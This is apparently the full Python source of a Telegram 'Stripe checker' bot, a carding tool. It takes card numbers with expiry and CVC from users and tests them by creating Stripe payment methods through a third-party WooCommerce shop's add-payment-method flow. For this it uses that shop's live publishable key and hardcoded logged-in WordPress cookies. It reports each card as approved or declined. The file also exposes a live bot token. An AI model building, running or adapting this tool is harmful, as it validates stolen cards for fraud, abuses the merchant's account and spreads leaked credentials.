"""
Stripe Payment Method Checker - Telegram Bot
Works locally with polling OR on Render with webhook
"""

import os
import requests
import uuid
import time
import json
import re
import threading
from typing import Optional, Dict, Any
from flask import Flask, request

# ============== CONFIGURATION ==============
BOT_TOKEN = "7950514269:AAElXX262n31xiSn1pCxthxhuMpjw9VjtVg"
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "")  # Empty = polling mode
PING_INTERVAL = 300

# Site Configuration
SITE_URL = "https://infiniteautowerks.com"
PUBLISHABLE_KEY = "pk_live_51MwcfkEreweRX4nmunyHnVjt6qSmKUgaafB7msRfg4EsQrStC8l0FlevFiuf2vMpN7oV9B5PGmIc7uNv1tdnvnTv005ZJCfrCk"
COOKIES = """wordpress_sec_e7182569f4777e7cdbb9899fb576f3eb=hbjgyhtfr%7C1768803658%7CYqxUeXNjAKwu20bDX2VG2kndYvX3RbKMYY5BIzFEdCl%7C14873263ec0ace12b4c8926c1472fb012761f36b0d1dcfe2e7df480516bed7b5; wordpress_logged_in_e7182569f4777e7cdbb9899fb576f3eb=hbjgyhtfr%7C1768803658%7CYqxUeXNjAKwu20bDX2VG2kndYvX3RbKMYY5BIzFEdCl%7Ced82f62145a463255c68d252f811c3baaa30f700a9a0ec76d330611126f019de"""
POSTAL_CODE = "10001"
COUNTRY = "US"

COUNTRY_MAP = {
    'TH': 'Thailand', 'BR': 'Brazil', 'US': 'United States', 'IN': 'India',
    'GB': 'United Kingdom', 'CA': 'Canada', 'AU': 'Australia', 'DE': 'Germany',
    'FR': 'France', 'IT': 'Italy', 'ES': 'Spain', 'MX': 'Mexico', 'JP': 'Japan',
    'CN': 'China', 'KR': 'South Korea', 'RU': 'Russia', 'NL': 'Netherlands',
    'PH': 'Philippines', 'ID': 'Indonesia', 'MY': 'Malaysia', 'SG': 'Singapore',
    'VN': 'Vietnam', 'PK': 'Pakistan', 'BD': 'Bangladesh', 'NG': 'Nigeria',
    'ZA': 'South Africa', 'EG': 'Egypt', 'TR': 'Turkey', 'PL': 'Poland',
    'UA': 'Ukraine', 'AR': 'Argentina', 'CO': 'Colombia', 'CL': 'Chile',
    'PE': 'Peru', 'VE': 'Venezuela', 'SA': 'Saudi Arabia', 'AE': 'UAE',
    'IL': 'Israel', 'SE': 'Sweden', 'NO': 'Norway', 'DK': 'Denmark',
    'FI': 'Finland', 'BE': 'Belgium', 'AT': 'Austria', 'CH': 'Switzerland',
    'PT': 'Portugal', 'GR': 'Greece', 'CZ': 'Czech Republic', 'RO': 'Romania',
    'HU': 'Hungary', 'IE': 'Ireland', 'NZ': 'New Zealand', 'HK': 'Hong Kong',
    'TW': 'Taiwan', 'KE': 'Kenya', 'GH': 'Ghana', 'MA': 'Morocco'
}

app = Flask(__name__)


# ============== TELEGRAM API ==============
def send_message(chat_id: int, text: str, parse_mode: str = None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text}
    if parse_mode:
        data["parse_mode"] = parse_mode
    return requests.post(url, json=data)

def edit_message(chat_id: int, message_id: int, text: str):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
    data = {"chat_id": chat_id, "message_id": message_id, "text": text}
    requests.post(url, json=data)

def get_updates(offset=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    params = {"timeout": 30}
    if offset:
        params["offset"] = offset
    try:
        resp = requests.get(url, params=params, timeout=35)
        return resp.json().get("result", [])
    except:
        return []


# ============== STRIPE AUTOMATION ==============
class StripeWooCommerceAutomation:
    def __init__(self, site_url: str, cookies: str = None, publishable_key: str = None):
        self.site_url = site_url.rstrip('/')
        self.cookies = cookies
        self.publishable_key = publishable_key
        self.session = requests.Session()
        if cookies:
            self._set_cookies(cookies)
    
    def _set_cookies(self, cookie_string: str):
        for item in cookie_string.split('; '):
            if '=' in item:
                key, value = item.split('=', 1)
                self.session.cookies.set(key, value)
    
    def _generate_session_ids(self):
        return {
            'guid': str(uuid.uuid4()).replace('-', '')[:32] + 'ca450',
            'muid': str(uuid.uuid4()).replace('-', '')[:32] + '531d',
            'sid': str(uuid.uuid4()).replace('-', '')[:32] + '05f1',
            'client_session_id': str(uuid.uuid4()),
        }
    
    def fetch_ajax_nonce(self):
        url = f"{self.site_url}/my-account/add-payment-method/"
        headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        try:
            response = self.session.get(url, headers=headers, timeout=30)
            patterns = [
                r'"createAndConfirmSetupIntentNonce"\s*:\s*"([a-f0-9]+)"',
                r'_ajax_nonce["\']?\s*[:=]\s*["\']([a-f0-9]+)["\']',
            ]
            for pattern in patterns:
                match = re.search(pattern, response.text)
                if match:
                    return match.group(1)
        except:
            pass
        return None
    
    def create_payment_method(self, card_number, exp_month, exp_year, cvc, postal_code, country="US"):
        url = "https://api.stripe.com/v1/payment_methods"
        headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        session_ids = self._generate_session_ids()
        data = {
            'type': 'card',
            'card[number]': card_number.replace(' ', '').replace('-', ''),
            'card[cvc]': cvc,
            'card[exp_year]': exp_year,
            'card[exp_month]': exp_month,
            'billing_details[address][postal_code]': postal_code,
            'billing_details[address][country]': country,
            'payment_user_agent': 'stripe.js/066093a970; stripe-js-v3/066093a970; payment-element; deferred-intent',
            'referrer': self.site_url,
            'client_attribution_metadata[client_session_id]': session_ids['client_session_id'],
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
            'guid': session_ids['guid'],
            'muid': session_ids['muid'],
            'sid': session_ids['sid'],
            'key': self.publishable_key,
            '_stripe_version': '2024-06-20'
        }
        try:
            response = requests.post(url, headers=headers, data=data, timeout=30)
            result = response.json()
            card_info = result.get('card', {})
            return {
                'success': 'id' in result,
                'response': result,
                'payment_method_id': result.get('id'),
                'card_brand': card_info.get('brand', '').upper(),
                'card_funding': card_info.get('funding', '').upper(),
                'card_country': card_info.get('country'),
            }
        except Exception as e:
            return {'success': False, 'error': str(e), 'response': {}}
    
    def confirm_setup_intent(self, payment_method_id, ajax_nonce):
        url = f"{self.site_url}/wp-admin/admin-ajax.php"
        headers = {
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'x-requested-with': 'XMLHttpRequest'
        }
        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce
        }
        try:
            response = self.session.post(url, headers=headers, data=data, timeout=30)
            result = response.json()
            success = result.get('success') == True
            error_msg = result.get('data', {}).get('error', {}).get('message') if not success else None
            return {'success': success, 'error_message': error_msg}
        except Exception as e:
            return {'success': False, 'error_message': str(e)}
    
    def add_payment_method(self, card_number, exp_month, exp_year, cvc, postal_code, country="US"):
        result = {'step1_create_pm': None, 'overall_success': False}
        
        pm_result = self.create_payment_method(card_number, exp_month, exp_year, cvc, postal_code, country)
        result['step1_create_pm'] = pm_result
        
        if not pm_result['success']:
            result['error_message'] = pm_result.get('response', {}).get('error', {}).get('message', 'Card creation failed')
            return result
        
        ajax_nonce = self.fetch_ajax_nonce()
        if not ajax_nonce:
            result['error_message'] = "Could not find AJAX nonce"
            return result
        
        confirm_result = self.confirm_setup_intent(pm_result['payment_method_id'], ajax_nonce)
        
        if confirm_result['success']:
            result['overall_success'] = True
        else:
            result['error_message'] = confirm_result.get('error_message') or 'Confirmation failed'
        
        return result


# ============== CARD CHECKER ==============
def parse_card_pipe(card_string):
    parts = card_string.strip().split('|')
    if len(parts) != 4:
        raise ValueError("Format: NUMBER|MM|YYYY|CVC")
    number, month, year, cvc = parts
    if len(year) == 4:
        year = year[-2:]
    return {'number': number.strip(), 'exp_month': month.strip().zfill(2), 'exp_year': year.strip(), 'cvc': cvc.strip()}


def check_card(card_string):
    try:
        card = parse_card_pipe(card_string)
    except ValueError as e:
        return f"❌ Error: {e}"
    
    automation = StripeWooCommerceAutomation(SITE_URL, COOKIES, PUBLISHABLE_KEY)
    result = automation.add_payment_method(card['number'], card['exp_month'], card['exp_year'], card['cvc'], POSTAL_CODE, COUNTRY)
    
    pm_result = result.get('step1_create_pm', {})
    card_brand = pm_result.get('card_brand', 'UNKNOWN')
    card_funding = pm_result.get('card_funding', 'UNKNOWN')
    card_country_code = pm_result.get('card_country', '')
    card_country = COUNTRY_MAP.get(card_country_code, card_country_code or 'Unknown')
    
    year_full = f"20{card['exp_year']}" if len(card['exp_year']) == 2 else card['exp_year']
    card_str = f"{card['number']}|{card['exp_month']}|{year_full}|{card['cvc']}"
    
    status = "🌠 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 ✅" if result['overall_success'] else "❌ 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 ❌"
    
    output = f"""
{status}

𝗖𝗮𝗿𝗱: {card_str}
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Auth
𝐈𝐧𝐟𝐨: {card_brand} - {card_funding}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {card_country} {card_country_code}
𝐎𝐰𝐧𝐞𝐫: @llegaccy
"""
    if not result['overall_success']:
        output += f"𝐄𝐫𝐫𝐨𝐫: {result.get('error_message', 'Unknown')}\n"
    
    return output


# ============== COMMAND HANDLERS ==============
def handle_start(chat_id):
    msg = """🔥 *Welcome to Stripe Checker Bot* 🔥

🌟 Premium Card Checker
⚡ Fast & Reliable Stripe Auth

📌 Use /cmd to see commands
👤 Owner: @llegaccy"""
    send_message(chat_id, msg, "Markdown")


def handle_cmd(chat_id):
    msg = """📋 *Commands*

/start - Welcome
/cum <card> - Check card
/cmd - Help

📝 Format: `/cum 4111111111111111|12|2025|123`"""
    send_message(chat_id, msg, "Markdown")


def handle_cum(chat_id, card_string):
    if not card_string:
        send_message(chat_id, "❌ Provide a card!\nFormat: /cum NUMBER|MM|YYYY|CVC")
        return
    
    resp = send_message(chat_id, "⏳ Checking card...")
    msg_id = resp.json().get("result", {}).get("message_id")
    
    result = check_card(card_string)
    
    if msg_id:
        edit_message(chat_id, msg_id, result)
    else:
        send_message(chat_id, result)


def process_update(update):
    message = update.get('message', {})
    chat_id = message.get('chat', {}).get('id')
    text = message.get('text', '')
    
    if not chat_id or not text:
        return
    
    print(f"[BOT] Received: {text}")
    
    if text.startswith('/start'):
        handle_start(chat_id)
    elif text.startswith('/cmd'):
        handle_cmd(chat_id)
    elif text.startswith('/cum'):
        card = text.replace('/cum', '').strip()
        handle_cum(chat_id, card)


# ============== POLLING MODE (LOCAL) ==============
def run_polling():
    print("🤖 Bot started in POLLING mode (local testing)")
    print("Send /start to your bot in Telegram!")
    
    # Delete any existing webhook
    requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook")
    
    offset = None
    while True:
        updates = get_updates(offset)
        for update in updates:
            offset = update['update_id'] + 1
            process_update(update)


# ============== FLASK ROUTES (RENDER) ==============
@app.route('/')
def home():
    return "🤖 Stripe Checker Bot is running!"

@app.route('/ping')
def ping():
    return "pong", 200

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.get_json()
    if data:
        process_update(data)
    return 'OK'

@app.route('/setwebhook')
def set_webhook():
    if WEBHOOK_URL:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={WEBHOOK_URL}/webhook"
        return requests.get(url).json()
    return {"error": "WEBHOOK_URL not set"}


# ============== MAIN ==============
if __name__ == "__main__":
    if WEBHOOK_URL:
        # Render mode - webhook
        print(f"🌐 Webhook mode: {WEBHOOK_URL}")
        port = int(os.environ.get("PORT", 5000))
        app.run(host='0.0.0.0', port=port)
    else:
        # Local mode - polling
        run_polling()
